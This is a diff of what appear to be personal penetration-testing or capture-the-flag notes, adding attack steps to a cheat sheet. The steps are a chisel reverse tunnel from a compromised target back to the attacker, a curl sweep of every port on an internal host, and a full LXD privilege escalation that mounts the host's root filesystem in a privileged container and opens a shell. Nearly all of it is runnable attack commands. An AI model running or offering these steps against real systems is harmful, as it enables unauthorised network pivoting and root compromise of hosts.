@@ -84,10 +84,12 @@ On our machine:
 On the target Machine:
 2. Transfer the chisel client
 3. chmod +x chisel
-4. ./chisel client [Our IP]:[Our Port] R:[Localport usually 22]:[The IP we want to proxy]:[The Service port we want to proxy]
+4. ./chisel client [Our IP]:[Our Port] R:[The IP we want to proxy]:[The Service port we want to proxy]
 R:<local-interface>:<local-port>:<remote-host>:<remote-port>/<protocol>
 IF error, or stuff, just remove the local interface
-
+5. ss -ltn | grep -i [service port], if the service port available, you have succeed.
+6. You can now use the service locally.
+Ex: http://10.8.102.36:8080/ >> Our ip and the service port we want to proxy
 
 
 **LOGS**
@@ -95,10 +97,27 @@ IF error, or stuff, just remove the local interface
 2. Always check /var/log/apache2/access.log
 
 
+
 **Internal**
 1. Fast internal network scan
 ex: curl http://[IP]:[Port range with the brackets]
 - curl http://10.10.11.88:[0-65353]
+
+
+
+**LXD**
+1. git clone  https://github.com/saghul/lxd-alpine-builder.git
+2. cd lxd-alpine-builder
+3. ./build-alpine
+4. transfer the alpine tar.gz
+On the target machine
+5. lxc image import ./[alpine file] --alias hello
+6. lxc image list >> see our image
+7. lxc init hello ignite -c security.privileged=true
+8. lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+9. lxc start ignite
+10. lxc exec ignite /bin/sh
+
 
 
 **Wild card privesc**
